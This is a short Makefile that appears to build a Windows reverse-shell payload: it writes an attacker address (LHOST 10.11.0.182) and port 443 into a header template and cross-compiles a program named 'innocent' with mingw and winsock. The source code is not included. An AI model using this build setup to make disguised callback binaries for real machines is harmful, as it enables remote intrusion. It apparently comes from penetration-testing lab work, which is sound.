LHOST?=10.11.0.182
LPORT?=443

all: innocent

innocent.h: innocent_template.h
	cat innocent_template.h |sed "s/XYZZY/$(LHOST)/" | sed "s/FOOBAR/$(LPORT)/" | tee innocent.h

innocent: innocent.c innocent_template.h
	i686-w64-mingw32-gcc-win32 innocent.c -o innocent.exe -lwsock32 -lws2_32
